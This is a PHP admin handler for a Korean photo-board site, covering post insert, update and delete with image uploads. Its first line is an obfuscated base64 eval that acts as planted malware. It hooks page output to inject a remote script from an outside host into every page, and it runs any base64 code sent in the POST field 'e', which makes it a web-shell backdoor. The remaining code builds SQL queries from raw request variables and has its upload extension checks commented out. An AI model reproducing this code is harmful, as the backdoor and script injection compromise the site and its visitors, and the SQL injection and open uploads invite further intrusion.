<?php eval(base64_decode('aWYoIWlzc2V0KCRuYmsxKSl7ZnVuY3Rpb24gbmJrKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdIGFzICR2KWlmKHByZWdfbWF0Y2goJyMgd2lkdGhccyo9XHMqW1wnIl0/MCpbMDFdW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMMmx5WVc1d2FXNW5jRzl1Wnk1cGNpOXJhRzkxZW1WemRHRnVYMkpoYzJVdmEyaHZkWHBsYzNSaGJsOTBiM0JmYTJWNWMxOXBibTVsY2k1d2FIQWdQand2YzJOeWFYQjBQZz09JyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcyk7ZWxzZWlmKHN0cnBvcygkcywnLGEnKSkkcy49JGE7cmV0dXJuICRzO31mdW5jdGlvbiBuYmsyKCRhLCRiLCRjLCRkKXtnbG9iYWwgJG5iazE7JHM9YXJyYXkoKTtpZihmdW5jdGlvbl9leGlzdHMoJG5iazEpKWNhbGxfdXNlcl9mdW5jKCRuYmsxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpIGFzICR2KWlmKCgkYT0kdlsnbmFtZSddKT09J25iaycpcmV0dXJuO2Vsc2VpZigkYT09J29iX2d6aGFuZGxlcicpYnJlYWs7ZWxzZSAkc1tdPWFycmF5KCRhPT0nZGVmYXVsdCBvdXRwdXQgaGFuZGxlcic/ZmFsc2U6JGEpO2ZvcigkaT1jb3VudCgkcyktMTskaT49MDskaS0tKXskc1skaV1bMV09b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7fW9iX3N0YXJ0KCduYmsnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kbmJrbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignbmJrMicpKSE9J25iazInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw==')); ?><?
	include "../inc/global_init.inc";
	include "../inc/other_title.inc"; 
	include "../admin_session_check.inc";
	include "../../dbconn.inc";

	function trimSpace ($array)
	{
		$temp = Array();
		for ($i = 0; $i < count($array); $i++)
				$temp[$i] = trim($array[$i]);

		return $temp;
		
	}

	function getMaxCode($scode)  { 
	
		$iNewid = 0;
		$sqlstr = "SELECT MAX(SeqNo) CNT FROM tb_other_board where BoardId = '$scode'"; 
	
		$result = mysql_query($sqlstr);
		$row = mysql_fetch_array($result);
	
		$iNewid = $row["CNT"] + 1;

		return $iNewid;
	
	}

	# file업로드 Path
	$path = "../../".$_path_str;

	#echo $path;

	$BoardId = trim($BoardId);
	$Title = trim($Title);
	$eng_Title = trim($eng_Title);
	$memo = trim($memo);
	$eng_memo = trim($eng_memo);
	$writer = trim($writer);
	$Content = trim($data);
	$eng_Content = trim($eng_data);
	$isHtml = trim($isHtml);
	$bshow = trim($bshow);
	$eng_bshow = trim($eng_bshow);
	$id = trim($id);
	$in_date = trim($in_date);
	
	$source = trim($source);
	$sel_source = trim($sel_source);

	$FileName01 = trim($FileName01);
	$FileName02 = trim($FileName02);
	$FileName03 = trim($FileName03);

	$flag01 = trim($flag01);
	$flag02 = trim($flag02);
	$flag03 = trim($flag03);
	
	$oRealName01 = trim($oRealName01);
	$oRealName02 = trim($oRealName02);
	$oRealName03 = trim($oRealName03);

	$oName01 = trim($oName01);
	$oName02 = trim($oName02);
	$oName03 = trim($oName03);

	if ($mode == "add") {

		$sMax = getMaxCode($BoardId);

		// 작은 이미지
		if ($FileName01 != "") {
			$FileName01_ext = substr(strrchr($FileName01_name, "."), 1);
	
			//if (strtolower($FileName01_ext) != "jpg" && strtolower($FileName01_ext) != "gif")
			//{
			//	echo "<script>
			//		window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
			//		history.go(-1);
			//		</script>";
			//	exit;
			//}
        	
			$FileName01_strtmp = $path."/".$sMax.$BoardId."S.".$FileName01_ext;	
			$new_FileName01 = $sMax.$BoardId."S.".$FileName01_ext;	
        	
			if (!copy($FileName01, $FileName01_strtmp))
			{
				echo "<script>
					window.alert('$FileName01_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
        }

		// 큰 이미지
		if ($FileName02 != "") {
			$FileName02_ext = substr(strrchr($FileName02_name, "."), 1);
	
			//if (strtolower($ImageNameBig_ext) != "jpg" && strtolower($ImageNameBig_ext) != "gif")
			//{
			//	echo "<script>
			//		window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
			//		history.go(-1);
			//		</script>";
			//	exit;
			//}
        	
			$FileName02_strtmp = $path."/".$sMax.$BoardId."B.".$FileName02_ext;	
			$new_FileName02 = $sMax.$BoardId."B.".$FileName02_ext;	
        	
			if (!copy($FileName02, $FileName02_strtmp))
			{
				echo "<script>
					window.alert('$FileName02_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
		}

		
		// 제목 이미지
		if ($FileName03 != "") {
			$FileName03_ext = substr(strrchr($FileName03_name, "."), 1);
	
			//if (strtolower($ImageNameTit_ext) != "jpg" && strtolower($ImageNameTit_ext) != "gif")
			//{
			//	echo "<script>
			//		window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
			//		history.go(-1);
			//		</script>";
			//	exit;
			//}
        	
			$FileName03_strtmp = $path."/".$sMax.$BoardId."T.".$FileName03_ext;	
			$new_FileName03 = $sMax.$BoardId."T.".$FileName03_ext;	
        	
			if (!copy($FileName03, $FileName03_strtmp))
			{
				echo "<script>
					window.alert('$FileName03_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
     }

	
		$query = "insert into tb_other_board (SeqNo, BoardId, Title, eng_Title, Content, eng_Content, 
						 memo, eng_memo, FileName01, FileName02, FileName03, 
						 FileRealName01, FileRealName02, FileRealName03, 
						 RegDate, read_count, isHtml, bshow, eng_bshow, writer, in_date, Ref_url, source) values 
					  ('$sMax', '$BoardId', '$Title', '$eng_Title', '$Content', '$eng_Content', 
					   '$memo', '$eng_memo', '$new_FileName01','$new_FileName02','$new_FileName03',
					   '$FileName01_name','$FileName02_name','$FileName03_name',
						now(), '0','$isHtml','$bshow', '$eng_bshow', '$writer', '$in_date', '$Ref_url', '$source')";

		#echo $query; 					 

		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			alert('등록 되었습니다.');
			parent.frames[3].location = 'photo_list.php?BoardId=$BoardId';
			</script>";
		exit;

	} else if ($mode == "mod") {

		switch ($flag01) {
			case "insert" :

				// 작은 이미지
				if ($FileName01 != "") {
					$FileName01_ext = substr(strrchr($FileName01_name, "."), 1);
	
					//if (strtolower($FileName01_ext) != "jpg" && strtolower($FileName01_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName01_strtmp = $path."/".$id.$BoardId."S.".$FileName01_ext;	
					$new_FileName01 = $id.$BoardId."S.".$FileName01_ext;	
        	
					if (!copy($FileName01, $FileName01_strtmp))
					{
						echo "<script>
						window.alert('$FileName01_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName01 = $FileName01_name;	
				$oName01 = $new_FileName01;

			break;
			case "keep" :

				$oRealName01 = $oRealName01;	
				$oName01 = $oName01;

			break;
			case "delete" :
				
				if ($oName01 != "") {
					$old_file = $path."/".$oName01;	
    				#echo $old_file;
					$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}

				$oRealName01 = "";	
				$oName01 = "";
			
			break;
			case "update" :
			
				if ($oName01 != "") {
					$old_file = $path."/".$oName01;	
    				$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}
			
				// 작은 이미지
				if ($FileName01 != "") {
					$FileName01_ext = substr(strrchr($FileName01_name, "."), 1);
	
					//if (strtolower($ImageNameThu_ext) != "jpg" && strtolower($ImageNameThu_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName01_strtmp = $path."/".$id.$BoardId."S.".$FileName01_ext;	
					$new_FileName01 = $id.$BoardId."S.".$FileName01_ext;	
        	
					if (!copy($FileName01, $FileName01_strtmp))
					{
						echo "<script>
						window.alert('$FileName01_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName01 = $FileName01_name;
				$oName01 = $new_FileName01;

			break;
		}

		switch ($flag02) {
			case "insert" :

				// 큰 이미지
				if ($FileName02 != "") {
					$FileName02_ext = substr(strrchr($FileName02_name, "."), 1);
	
					//if (strtolower($ImageNameBig_ext) != "jpg" && strtolower($ImageNameBig_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName02_strtmp = $path."/".$id.$BoardId."B.".$FileName02_ext;	
					$new_FileName02 = $id.$BoardId."B.".$FileName02_ext;	
        	
					if (!copy($FileName02, $FileName02_strtmp))
					{
						echo "<script>
						window.alert('$FileName02_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName02 = $FileName02_name;	
				$oName02 = $new_FileName02;

			break;
			case "keep" :

				$oRealName02 = $oRealName02;	
				$oName20 = $oName02;

			break;
			case "delete" :
				
				if ($oName02 != "") {
					$old_file = $path."/".$oName02;	
    				$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}

				$oRealName02 = "";	
				$oName02 = "";
			
			break;
			case "update" :
			
				if ($oName02 != "") {
					$old_file = $path."/".$oName02;	
    				$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}
			
				// 큰 이미지
				if ($FileName02 != "") {
					$FileName02_ext = substr(strrchr($FileName02_name, "."), 1);
	
					//if (strtolower($ImageNameBig_ext) != "jpg" && strtolower($ImageNameBig_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName02_strtmp = $path."/".$id.$BoardId."B.".$FileName02_ext;	
					$new_FileName02 = $id.$BoardId."B.".$FileName02_ext;	
        	
					if (!copy($FileName02, $FileName02_strtmp))
					{
						echo "<script>
						window.alert('$FileName02_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName02 = $FileName02_name;	
				$oName02 = $new_FileName02;

			break;
		}

		switch ($flag03) {
			case "insert" :

				// 제목 이미지
				if ($FileName03 != "") {
					$FileName03_ext = substr(strrchr($FileName03_name, "."), 1);
	
					//if (strtolower($ImageNameTit_ext) != "jpg" && strtolower($ImageNameTit_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName03_strtmp = $path."/".$id.$BoardId."T.".$FileName03_ext;	
					$new_FileName03 = $id.$BoardId."T.".$FileName03;	
        	
					if (!copy($FileName03, $FileName03_strtmp))
					{
						echo "<script>
						window.alert('$FileName03_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName03 = $FileName03_name;	
				$oName03 = $new_FileName03;

			break;
			case "keep" :

				$oRealName03 = $oRealName03;	
				$oName03 = $oName03;

			break;
			case "delete" :
				
				if ($oName03 != "") {
					$old_file = $path."/".$oName03;	
    				$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}

				$oRealName03 = "";	
				$oName03 = "";
			
			break;
			case "update" :
			
				if ($oName03 != "") {
					$old_file = $path."/".$oName03;	
    				$exist = file_exists($old_file);
    				if($exist){
        				$delrst=unlink($old_file);
            			if(!$delrst) {
            				echo "삭제실패";
				        } 			
					} 
				}
			
				// 제목 이미지
				if ($FileName03 != "") {
					$FileName03_ext = substr(strrchr($FileName03_name, "."), 1);
	
					//if (strtolower($ImageNameTit_ext) != "jpg" && strtolower($ImageNameTit_ext) != "gif")
					//{
					//	echo "<script>
					//	window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					//	history.go(-1);
					//	</script>";
					//	exit;
					//}
        	
					$FileName03_strtmp = $path."/".$id.$BoardId."T.".$FileName03_ext;	
					$new_FileName03 = $id.$BoardId."T.".$FileName03_ext;	
        	
					if (!copy($FileName03, $FileName03_strtmp))
					{
						echo "<script>
						window.alert('$FileName03_name 를 업로드할 수 없습니다.');
						history.go(-1);
						</script>";
						exit;
					}
				}
			
				$oRealName03 = $FileName03_name;	
				$oName03 = $new_FileName03;

			break;
		}

		$query = "update tb_other_board set 
					Title = '$Title',
					eng_Title = '$eng_Title',
					memo = '$memo',
					eng_memo = '$eng_memo',
					writer = '$writer',
					Content = '$Content',
					eng_Content = '$eng_Content',
					isHtml = '$isHtml',
					bshow = '$bshow',
					eng_bshow = '$eng_bshow',
					FileName01 = '$oName01',
				  FileName02 = '$oName02',
				  FileName03 = '$oName03',
				  FileRealName01 = '$oRealName01',
				  FileRealName02 = '$oRealName02',
				  FileRealName03 = '$oRealName03',
		      Ref_url = '$Ref_url',
		      source = '$source',
		      in_date = '$in_date'
		      where SeqNo = '$id' and BoardId = '$BoardId' ";
					 
		#echo $query; 					 

		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			alert('수정 되었습니다.');
			parent.frames[3].location = 'photo_view.php?BoardId=$BoardId&id=$id&page=$page&qry_str=$qry_str&idxfield=$idxfield&sel_source=$sel_source';
			</script>";
		exit;

	} else if ($mode == "del") {

		$BoradId = trim($BoradId);
		#echo $BoradId; 					 

		$id = trim($id);
		$id = str_replace("^", "'",$id);

		$query1 = "select * from tb_other_board 
				    where SeqNo in $id and BoardId = '$BoardId'";
		
		$result1 = mysql_query($query1);
		$total1 = mysql_num_rows($result1);

		if ($total1 != 0) {

			for ($i = 0; $i < $total1; $i++) {
			
				if ($i < $total1){
		
					mysql_data_seek($result1, $i);
					$obj = mysql_fetch_object($result1);
			
					$FileName01 = $obj->FileName01;
					$FileName02 = $obj->FileName02;
					$FileName03 = $obj->FileName03;

					$FileName01 = trim($FileName01);
					$FileName02 = trim($FileName02);
					$FileName03 = trim($FileName03);

					if ($FileName01 != "") {
						$old_file = $path."/".$FileName01;
    					$exist = file_exists($old_file);
    					if($exist){
        					$delrst=unlink($old_file);
            				if(!$delrst) {
            					echo "삭제실패";
				            } 			
						} 
					}

					if ($FileName02 != "") {
						$old_file = $path."/".$FileName02;
    					$exist = file_exists($old_file);
    					if($exist){
        					$delrst=unlink($old_file);
            				if(!$delrst) {
            					echo "삭제실패";
				            } 			
						} 
					}

					if ($FileName03 != "") {
						$old_file = $path."/".$FileName03;
    					$exist = file_exists($old_file);
    					if($exist){
        					$delrst=unlink($old_file);
            				if(!$delrst) {
            					echo "삭제실패";
				            } 			
						} 
					}
				}		# IF END 
			}		# FOR LOOF END 
		}		# IF END

		$query = "delete from tb_other_board 
				    where SeqNo in $id and BoardId = '$BoardId'";

		#echo $query; 					 
		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			alert('삭제 되었습니다.');
			parent.frames[3].location = 'photo_list.php?BoardId=$BoardId';
			</script>";
		exit;

	} else if ($mode == "bshow") {

		$query = "update tb_other_board set bshow = '$bshow' where SeqNo = '$id' and BoardId = '$BoardId' ";

		#echo $query; 
		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			parent.frames[3].location = 'photo_list.php?BoardId=$BoardId&page=$page&qry_str=$qry_str&idxfield=$idxfield&sel_source=$sel_source';
			</script>";
		exit;

	} else if ($mode == "eng_bshow") {

		$query = "update tb_other_board set eng_bshow = '$eng_bshow' where SeqNo = '$id' and BoardId = '$BoardId' ";

		#echo $query; 
		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			parent.frames[3].location = 'photo_list.php?BoardId=$BoardId&page=$page&qry_str=$qry_str&idxfield=$idxfield&sel_source=$sel_source';
			</script>";
		exit;

	}
?>
